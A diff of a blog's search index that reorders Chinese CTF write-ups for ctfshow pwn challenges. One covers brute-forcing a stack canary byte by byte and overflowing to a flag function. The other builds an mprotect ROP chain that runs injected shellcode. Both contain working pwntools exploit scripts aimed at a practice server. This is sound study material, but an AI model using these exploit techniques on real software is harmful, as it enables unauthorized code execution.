@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Canary爆破</title>
-    <url>/2025/01/25/Canary%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<h1 id="ctfshow53"><a href="#ctfshow53" class="headerlink" title="ctfshow53"></a>ctfshow53</h1><h2 id="（1）checksec"><a href="#（1）checksec" class="headerlink" title="（1）checksec"></a>（1）checksec</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png" alt="image-20250125213308165"></p>
-<p>发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变</p>
-<p>思路：我们可以逐字节的将canary爆破出来</p>
-<h2 id="（2）ida代码审计"><a href="#（2）ida代码审计" class="headerlink" title="（2）ida代码审计"></a>（2）ida代码审计</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png" alt="image-20250125213837949"></p>
-<p><strong>看看Canary</strong></p>
-<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213943366.png" alt="image-20250125213943366"></p>
-<p>意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary</p>
-<p><strong>看看ctfshow</strong></p>
-<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125214349626.png" alt="image-20250125214349626"></p>
-<p>  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为<code>size_t</code> 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 <code>0xFFFFFFFF</code>，即 <code>size_t</code> 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出</p>
-<p>最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”</p>
-<p><strong>最后flag</strong></p>
-<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220303086.png" alt="image-20250125220303086"></p>
-<p>意思就是打开flag的文件，通过puts函数将flag的值输出</p>
-<h2 id="（3）思路"><a href="#（3）思路" class="headerlink" title="（3）思路"></a>（3）思路</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220808158.png" alt="image-20250125220808158"></p>
-<p>先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以</p>
-<h3 id="1-canary爆破"><a href="#1-canary爆破" class="headerlink" title="1.canary爆破"></a>1.canary爆破</h3><p>爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span>                                           <span class="comment">#定义canary</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):                                     <span class="comment">#这里是两层循环，因为canary是四个字节所以外层循环4次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):                             <span class="comment">#这个循环尝试所有可能的字节值（从 0x00 到 0xFF）</span></span><br><span class="line">        p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28179</span>)      </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;200&#x27;</span>)                   <span class="comment">#200为用户名</span></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(j)           <span class="comment">#先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的</span></span><br><span class="line">        p.sendafter(<span class="string">&#x27;$ &#x27;</span>, payload)                     </span><br><span class="line">        ans = <span class="built_in">str</span>(p.recv())                            <span class="comment">#将接收的的值转化为字符串赋值给ans</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:       <span class="comment">#这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的</span></span><br><span class="line">            canary += p8(j)                            <span class="comment">#将新爆破出来的值加到已经爆破出来的值的后面</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;NO:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>  <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>)               <span class="comment">#因为i是取0-3的整数，所以要+1才是canary的第几个值</span></span><br><span class="line">            <span class="keyword">break</span>                                      <span class="comment">#退出循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;try again! <span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)                   <span class="comment">#最后将canary的值转换为32位输出出来</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="2.栈溢出"></a>2.栈溢出</h3><p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28179</span>)</span><br><span class="line">canary=<span class="number">0x21443633</span>                              <span class="comment">#canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的</span></span><br><span class="line">flag=<span class="number">0x08048696</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How many bytes do you want to write to the buffer?\n&gt;&#x27;</span>)  </span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)                              <span class="comment">#绕过while循环，并使得可以借助read函数栈溢出</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)                            </span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>)+p32(flag) <span class="comment">#payload=覆盖到s1+canary+覆盖到返回地址+返回地址</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/2302_77659150/article/details/143097969">ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/2301_79880074/article/details/135883546">canary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>第二周</category>
-      </categories>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfshow 43，44</title>
     <url>/2025/01/22/ctfshow/</url>
     <content><![CDATA[<h1 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h1><p>ida：</p>
@@ -71,6 +36,41 @@
 <li><p>32位调用函数压栈顺序是先压参数最后压返回函数，64位先是压入返回函数然后将参数放在寄存器</p>
 </li>
 </ol>
+]]></content>
+      <categories>
+        <category>第二周</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Canary爆破</title>
+    <url>/2025/01/25/Canary%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<h1 id="ctfshow53"><a href="#ctfshow53" class="headerlink" title="ctfshow53"></a>ctfshow53</h1><h2 id="（1）checksec"><a href="#（1）checksec" class="headerlink" title="（1）checksec"></a>（1）checksec</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png" alt="image-20250125213308165"></p>
+<p>发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变</p>
+<p>思路：我们可以逐字节的将canary爆破出来</p>
+<h2 id="（2）ida代码审计"><a href="#（2）ida代码审计" class="headerlink" title="（2）ida代码审计"></a>（2）ida代码审计</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png" alt="image-20250125213837949"></p>
+<p><strong>看看Canary</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213943366.png" alt="image-20250125213943366"></p>
+<p>意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary</p>
+<p><strong>看看ctfshow</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125214349626.png" alt="image-20250125214349626"></p>
+<p>  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为<code>size_t</code> 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 <code>0xFFFFFFFF</code>，即 <code>size_t</code> 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出</p>
+<p>最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”</p>
+<p><strong>最后flag</strong></p>
+<p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220303086.png" alt="image-20250125220303086"></p>
+<p>意思就是打开flag的文件，通过puts函数将flag的值输出</p>
+<h2 id="（3）思路"><a href="#（3）思路" class="headerlink" title="（3）思路"></a>（3）思路</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220808158.png" alt="image-20250125220808158"></p>
+<p>先将canary逐个字节爆破出来，然后通过栈溢出返回到flag的地址就可以</p>
+<h3 id="1-canary爆破"><a href="#1-canary爆破" class="headerlink" title="1.canary爆破"></a>1.canary爆破</h3><p>爆破canary s1中储存的就是canary的值，我们可以先覆盖0x20个数据覆盖到s1，然后一个字节一个字节的去覆盖s1的值，因为只覆盖一个字节，其他的不变，通过看puts函数输出的值判断是否覆盖正确，当第一个字节正确就把他记录下来，然后爆破第二个字节时，再将第一个字节输入进去再爆破第二个字节，依次类推，这里我们可以借助脚本去爆破,粘贴一个大佬写的脚本我来解释一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">canary = <span class="string">b&#x27;&#x27;</span>                                           <span class="comment">#定义canary</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):                                     <span class="comment">#这里是两层循环，因为canary是四个字节所以外层循环4次</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):                             <span class="comment">#这个循环尝试所有可能的字节值（从 0x00 到 0xFF）</span></span><br><span class="line">        p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28179</span>)      </span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;200&#x27;</span>)                   <span class="comment">#200为用户名</span></span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + canary + p8(j)           <span class="comment">#先覆盖0x20到canary，在覆盖已经试出来前几个字节canary的值，再加上                                                         要尝试的</span></span><br><span class="line">        p.sendafter(<span class="string">&#x27;$ &#x27;</span>, payload)                     </span><br><span class="line">        ans = <span class="built_in">str</span>(p.recv())                            <span class="comment">#将接收的的值转化为字符串赋值给ans</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Canary Value Incorrect!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ans:       <span class="comment">#这个if循环是判断逐字节爆破的canary是否正确，我们知道错误就会输出                                                        Canary Value Incorrect!，如果我们接收到的数据中没有Canary Value                                                        Incorrect!就证明是正确的</span></span><br><span class="line">            canary += p8(j)                            <span class="comment">#将新爆破出来的值加到已经爆破出来的值的后面</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;NO:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>  <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&quot;</span>)               <span class="comment">#因为i是取0-3的整数，所以要+1才是canary的第几个值</span></span><br><span class="line">            <span class="keyword">break</span>                                      <span class="comment">#退出循环</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;try again! <span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)                   <span class="comment">#最后将canary的值转换为32位输出出来</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="2.栈溢出"></a>2.栈溢出</h3><p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28179</span>)</span><br><span class="line">canary=<span class="number">0x21443633</span>                              <span class="comment">#canary上面爆破过了，我们直接输入就可以，前提是canary的值是固定的</span></span><br><span class="line">flag=<span class="number">0x08048696</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;How many bytes do you want to write to the buffer?\n&gt;&#x27;</span>)  </span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)                              <span class="comment">#绕过while循环，并使得可以借助read函数栈溢出</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;$ &#x27;</span>)                            </span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(canary)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>)+p32(flag) <span class="comment">#payload=覆盖到s1+canary+覆盖到返回地址+返回地址</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/2302_77659150/article/details/143097969">ctfshowpwn 45 -＞ 90（已更新33）栈溢出_pwn59-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/2301_79880074/article/details/135883546">canary保护和pie保护的绕过_ctfshow pwn入门-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>第二周</category>
@@ -150,74 +150,6 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>mprotect函数</title>
-    <url>/2025/01/24/mprotect%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="一、mprotect-函数"><a href="#一、mprotect-函数" class="headerlink" title="一、mprotect() 函数"></a>一、<code>mprotect()</code> 函数</h1><h2 id="（1）mprotect-函数简介"><a href="#（1）mprotect-函数简介" class="headerlink" title="（1）mprotect() 函数简介"></a>（1）<code>mprotect()</code> 函数简介</h2><p>在二进制漏洞利用（Pwn）中，<code>mprotect()</code> 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 <code>mprotect()</code> 函数将该区域的权限修改为可执行。</p>
-<h2 id="（2）mprotect-函数的原型"><a href="#（2）mprotect-函数的原型" class="headerlink" title="（2）mprotect() 函数的原型"></a>（2）<code>mprotect()</code> 函数的原型</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数说明</strong>：</p>
-<table>
-<thead>
-<tr>
-<th>addr</th>
-<th>len</th>
-<th>prot</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍</td>
-<td>修改权限的内存区域的长度，单位是字节</td>
-<td>指定新的内存访问权限</td>
-</tr>
-</tbody></table>
-<p><strong>内存访问权限：</strong></p>
-<table>
-<thead>
-<tr>
-<th>PROT_READ</th>
-<th>PROT_WRITE</th>
-<th>PROT_EXEC</th>
-<th>PROT_NONE</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>允许读取该内存区域</td>
-<td>允许写入该内存区域</td>
-<td>允许执行该内存区域中的代码</td>
-<td>禁止对该内存区域进行任何访问</td>
-</tr>
-</tbody></table>
-<p><strong>注：一般prot直接修改为7，即可读可写可执行</strong></p>
-<h1 id="二、例题ctfshow49"><a href="#二、例题ctfshow49" class="headerlink" title="二、例题ctfshow49"></a>二、例题ctfshow49</h1><h2 id="（1）思路"><a href="#（1）思路" class="headerlink" title="（1）思路"></a>（1）思路</h2><p>我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以</p>
-<p>但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数</p>
-<p>我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”</p>
-<p><img src="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/image-20250125111005854.png" alt="image-20250125111005854"></p>
-<p>pop_ebx_esi_ebp_ret &#x3D; 0x080a019b</p>
-<p>第一个参数：addr&#x3D;0x80d8000</p>
-<p>第二个参数：len&#x3D;0x1000</p>
-<p>第三个参数：port&#x3D;7</p>
-<p>同样read函数也需要设置三个参数</p>
-<p>在 C 语言里，<code>read</code> 函数的原型如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数解释：</strong></p>
-<p>fd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）</p>
-<p>buf：指向用于存储读取数据的缓冲区的指针</p>
-<p>count：期望读取的最大字节数</p>
-<p>第一个参数：fd&#x3D;0</p>
-<p>第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）</p>
-<p>第三个参数：count&#x3D;0x1000</p>
-<h2 id="（2）exp"><a href="#（2）exp" class="headerlink" title="（2）exp"></a>（2）exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28134</span>)</span><br><span class="line">mprotect= elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x080a019b</span></span><br><span class="line">shellcode = asm(shellcraft.sh())               <span class="comment">#生成shellcode</span></span><br><span class="line">addr=<span class="number">0x80d8000</span></span><br><span class="line">buf=<span class="number">0x80d8000</span></span><br><span class="line"><span class="built_in">len</span>=<span class="number">0x1000</span></span><br><span class="line">port=<span class="number">7</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">0x4</span>)+p32(mprotect)           <span class="comment">#将返回地址设为mprotect</span></span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(<span class="built_in">len</span>)+p32(port)   <span class="comment">#设置mprotect的参数</span></span><br><span class="line">payload += p32(read)                              <span class="comment">#将mprotect返回地址设为read</span></span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="built_in">len</span>)               <span class="comment">#设置read的参数</span></span><br><span class="line">payload +=p32(buf)                               <span class="comment">#将read的返回地址设为buf（也就是shellcode）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)                            <span class="comment">#将shellcode写入bss</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>第二周</category>
-      </categories>
-      <tags>
-        <tag>wp</tag>
-      </tags>
   </entry>
   <entry>
     <title>shellcode（ctfshow58-64）</title>
@@ -343,6 +275,74 @@
       </tags>
   </entry>
   <entry>
+    <title>mprotect函数</title>
+    <url>/2025/01/24/mprotect%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="一、mprotect-函数"><a href="#一、mprotect-函数" class="headerlink" title="一、mprotect() 函数"></a>一、<code>mprotect()</code> 函数</h1><h2 id="（1）mprotect-函数简介"><a href="#（1）mprotect-函数简介" class="headerlink" title="（1）mprotect() 函数简介"></a>（1）<code>mprotect()</code> 函数简介</h2><p>在二进制漏洞利用（Pwn）中，<code>mprotect()</code> 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 <code>mprotect()</code> 函数将该区域的权限修改为可执行。</p>
+<h2 id="（2）mprotect-函数的原型"><a href="#（2）mprotect-函数的原型" class="headerlink" title="（2）mprotect() 函数的原型"></a>（2）<code>mprotect()</code> 函数的原型</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>addr</th>
+<th>len</th>
+<th>prot</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍</td>
+<td>修改权限的内存区域的长度，单位是字节</td>
+<td>指定新的内存访问权限</td>
+</tr>
+</tbody></table>
+<p><strong>内存访问权限：</strong></p>
+<table>
+<thead>
+<tr>
+<th>PROT_READ</th>
+<th>PROT_WRITE</th>
+<th>PROT_EXEC</th>
+<th>PROT_NONE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>允许读取该内存区域</td>
+<td>允许写入该内存区域</td>
+<td>允许执行该内存区域中的代码</td>
+<td>禁止对该内存区域进行任何访问</td>
+</tr>
+</tbody></table>
+<p><strong>注：一般prot直接修改为7，即可读可写可执行</strong></p>
+<h1 id="二、例题ctfshow49"><a href="#二、例题ctfshow49" class="headerlink" title="二、例题ctfshow49"></a>二、例题ctfshow49</h1><h2 id="（1）思路"><a href="#（1）思路" class="headerlink" title="（1）思路"></a>（1）思路</h2><p>我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以</p>
+<p>但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数</p>
+<p>我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”</p>
+<p><img src="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/image-20250125111005854.png" alt="image-20250125111005854"></p>
+<p>pop_ebx_esi_ebp_ret &#x3D; 0x080a019b</p>
+<p>第一个参数：addr&#x3D;0x80d8000</p>
+<p>第二个参数：len&#x3D;0x1000</p>
+<p>第三个参数：port&#x3D;7</p>
+<p>同样read函数也需要设置三个参数</p>
+<p>在 C 语言里，<code>read</code> 函数的原型如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数解释：</strong></p>
+<p>fd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）</p>
+<p>buf：指向用于存储读取数据的缓冲区的指针</p>
+<p>count：期望读取的最大字节数</p>
+<p>第一个参数：fd&#x3D;0</p>
+<p>第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）</p>
+<p>第三个参数：count&#x3D;0x1000</p>
+<h2 id="（2）exp"><a href="#（2）exp" class="headerlink" title="（2）exp"></a>（2）exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28134</span>)</span><br><span class="line">mprotect= elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_ebx_esi_ebp_ret = <span class="number">0x080a019b</span></span><br><span class="line">shellcode = asm(shellcraft.sh())               <span class="comment">#生成shellcode</span></span><br><span class="line">addr=<span class="number">0x80d8000</span></span><br><span class="line">buf=<span class="number">0x80d8000</span></span><br><span class="line"><span class="built_in">len</span>=<span class="number">0x1000</span></span><br><span class="line">port=<span class="number">7</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">0x4</span>)+p32(mprotect)           <span class="comment">#将返回地址设为mprotect</span></span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(<span class="built_in">len</span>)+p32(port)   <span class="comment">#设置mprotect的参数</span></span><br><span class="line">payload += p32(read)                              <span class="comment">#将mprotect返回地址设为read</span></span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(<span class="number">0</span>)+p32(buf)+p32(<span class="built_in">len</span>)               <span class="comment">#设置read的参数</span></span><br><span class="line">payload +=p32(buf)                               <span class="comment">#将read的返回地址设为buf（也就是shellcode）</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)                            <span class="comment">#将shellcode写入bss</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>第二周</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>shellcode（ctfshow65）</title>
     <url>/2025/01/31/shellcode2/</url>
     <content><![CDATA[<h1 id="ctfshow65"><a href="#ctfshow65" class="headerlink" title="ctfshow65"></a>ctfshow65</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX unknown - GNU_STACK missing</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
@@ -404,7 +404,7 @@
